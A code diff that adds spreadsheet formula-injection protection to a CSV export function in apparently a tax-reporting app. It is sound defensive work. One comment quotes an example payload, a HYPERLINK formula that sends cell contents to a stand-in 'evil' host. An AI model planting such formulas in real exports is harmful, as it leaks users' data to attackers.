@@ -494,10 +494,27 @@ export async function schedule112ACsv(userId: string, fy: string): Promise<strin
 
 function csvCell(v: string): string {
   if (v == null) return '';
-  const s = String(v);
+  let s = String(v);
+  // Neutralise spreadsheet formula injection. Excel and LibreOffice treat a
+  // cell beginning with = + - @ (or a leading tab/CR) as a formula and
+  // evaluate it on open. Free-text columns here — assetName, reviewReason —
+  // come from parsed broker and CAS documents, i.e. from outside. A crafted
+  // instrument name like =HYPERLINK("http://evil/?"&A1,"x") would run when
+  // the user opens their own Schedule 112A export.
+  //
+  // A leading apostrophe is the conventional fix: spreadsheets treat the rest
+  // as literal text and do not display it.
+  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
   if (/[",\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
   return s;
 }
+
+/**
+ * Test seam for `csvCell`, which stays module-private. Exported under an
+ * explicit name so the CSV-injection regression test asserts the real
+ * function rather than a copy of its logic.
+ */
+export const schedule112ACsvCellForTest = csvCell;
 
 // ─── Tax-loss harvesting view ───────────────────────────────────────
 
